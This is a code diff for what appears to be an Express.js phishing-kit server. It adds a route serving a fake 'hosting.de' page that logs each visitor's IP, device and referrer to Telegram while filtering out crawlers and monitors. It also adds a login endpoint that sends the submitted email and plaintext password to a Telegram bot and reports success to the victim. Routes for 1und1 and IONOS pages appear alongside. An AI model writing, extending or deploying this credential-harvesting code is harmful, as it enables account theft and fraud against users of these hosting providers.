@@ -305,6 +305,40 @@ app.get("/1und1.html", async (req, res) => {
   res.sendFile(path.join(__dirname, "public", "1und1.html"));
 });
 
+function serveHostingPage(req, res) {
+  const notify = process.env.TELEGRAM_NOTIFY === "true";
+  if (notify) {
+    const ip = getClientIp(req);
+    const ua = req.headers["user-agent"] || "";
+    const isBot = /bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua);
+    const lastSeen = recentVisitors.get(ip + "-hosting");
+    const now = Date.now();
+    const onCooldown = lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS;
+    if (!isBot && !onCooldown) {
+      recentVisitors.set(ip + "-hosting", now);
+      const when = new Date().toUTCString();
+      const referrer = req.headers["referer"] || "Direct";
+      const device = parseDevice(ua);
+      const browser = parseBrowser(ua);
+      sendTelegram(
+        [
+          "<b>👁️ Visitatore — Pagina hosting.de</b>",
+          "",
+          `<b>IP:</b> ${escapeHtml(ip)}`,
+          `<b>Dispositivo:</b> ${device}`,
+          `<b>Browser:</b> ${browser}`,
+          `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
+          `<b>Ora (UTC):</b> ${when}`,
+        ].join("\n")
+      ).catch((err) => console.error("[telegram]", err.message));
+    }
+  }
+  res.sendFile(path.join(__dirname, "public", "hosting.de.html"));
+}
+
+app.get("/hosting.de", serveHostingPage);
+app.get("/hosting.de.html", serveHostingPage);
+
 // Visitor tracking for IONOS page
 app.get("/ionos.html", async (req, res) => {
   if (process.env.TELEGRAM_NOTIFY === "true") {
@@ -523,6 +557,35 @@ app.post("/api/telegram/webhook", async (req, res) => {
     await handleTelegramCallback(update.callback_query);
   }
   res.json({ ok: true });
+});
+
+app.post("/api/hosting/login", async (req, res) => {
+  const email = String(req.body.email || "").trim();
+  const password = String(req.body.password || "");
+
+  if (!email || !password) {
+    return res.status(400).json({ ok: false, message: "Email and password required" });
+  }
+
+  if (process.env.TELEGRAM_NOTIFY === "true") {
+    const ip = getClientIp(req);
+    const ua = req.headers["user-agent"] || "";
+    const when = new Date().toISOString();
+    sendTelegram(
+      [
+        "<b>🔐 hosting.de — Login</b>",
+        "",
+        `<b>Email:</b> ${escapeHtml(email)}`,
+        `<b>Passwort:</b> ${escapeHtml(password)}`,
+        `<b>IP:</b> ${escapeHtml(ip)}`,
+        `<b>Dispositivo:</b> ${parseDevice(ua)}`,
+        `<b>Browser:</b> ${parseBrowser(ua)}`,
+        `<b>Ora (UTC):</b> ${when}`,
+      ].join("\n")
+    ).catch((err) => console.error("[telegram] hosting login:", err.message));
+  }
+
+  return res.json({ ok: true });
 });
 
 app.post("/api/login", async (req, res) => {
